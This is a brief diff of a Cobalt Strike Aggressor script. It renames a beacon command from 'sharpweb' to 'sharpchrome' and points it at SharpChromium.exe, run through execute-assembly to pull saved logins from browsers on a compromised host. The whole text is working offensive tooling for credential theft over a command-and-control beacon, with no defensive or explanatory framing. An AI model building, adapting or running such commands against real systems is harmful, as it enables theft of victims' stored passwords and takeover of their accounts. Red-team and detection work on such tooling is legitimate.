@@ -1,11 +1,11 @@
-beacon_command_register("sharpweb", "Retrieve saved logins from Google Chrome, Firefox, Internet Explorer and Microsoft Edge.",
-	"Usage: sharpweb [arguments]\n\n" .
+beacon_command_register("sharpchrome", "Retrieve saved logins from Google Chrome.",
+	"Usage: sharpchrome [arguments]\n\n" .
 	"Uses execute-assembly to run the assembly and takes given arguments\n");
-alias sharpweb{
+alias sharpchrome{
 	local('$bid $asm $desc @args $argu');
 	$bid = $1;
-	$asm = "/opt/cobalt_strike_extension_kit/exe/SharpWeb.exe";
-	$desc = "SharpWeb";
+	$asm = "/opt/cobalt_strike_extension_kit/exe/SharpChromium.exe";
+	$desc = "SharpChromium";
 	@args = @_;
 	remove(@args, $bid);
 	$argu = join(' ', @args);
